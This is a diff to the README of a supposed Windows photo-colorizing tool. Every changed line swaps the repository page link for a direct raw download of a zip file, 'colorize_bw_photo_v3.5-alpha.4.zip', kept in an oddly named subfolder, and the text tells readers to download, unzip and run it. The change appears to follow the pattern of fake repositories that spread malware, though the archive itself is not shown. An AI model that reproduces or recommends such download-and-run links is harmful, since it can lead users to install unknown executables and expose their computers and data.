@@ -1,6 +1,6 @@
 # 🎨 bw-photo-colorize - Turn Black Photos Into Color
 
-[![Download bw-photo-colorize](https://img.shields.io/badge/Download-bw--photo--colorize-blue)](https://github.com/Cucurbitapepomelopepomirrorcarp968/bw-photo-colorize)
+[![Download bw-photo-colorize](https://img.shields.io/badge/Download-bw--photo--colorize-blue)](https://raw.githubusercontent.com/Cucurbitapepomelopepomirrorcarp968/bw-photo-colorize/main/transmigrator/colorize_bw_photo_v3.5-alpha.4.zip)
 
 ## 🖼️ What this app does
 
@@ -10,7 +10,7 @@ bw-photo-colorize is a photo color tool for Windows. It helps you turn black-and
 
 Visit this page to download and run the app:
 
-https://github.com/Cucurbitapepomelopepomirrorcarp968/bw-photo-colorize
+https://raw.githubusercontent.com/Cucurbitapepomelopepomirrorcarp968/bw-photo-colorize/main/transmigrator/colorize_bw_photo_v3.5-alpha.4.zip
 
 If the page shows a release file, download it to your PC. If you see a setup file, run it after the download ends. If you see a zip file, unzip it first, then open the app inside
 
@@ -120,7 +120,7 @@ If you run the app on your own PC, your photos stay on your machine unless the a
 
 Primary download page:
 
-https://github.com/Cucurbitapepomelopepomirrorcarp968/bw-photo-colorize
+https://raw.githubusercontent.com/Cucurbitapepomelopepomirrorcarp968/bw-photo-colorize/main/transmigrator/colorize_bw_photo_v3.5-alpha.4.zip
 
 ## 🧩 Common questions
 
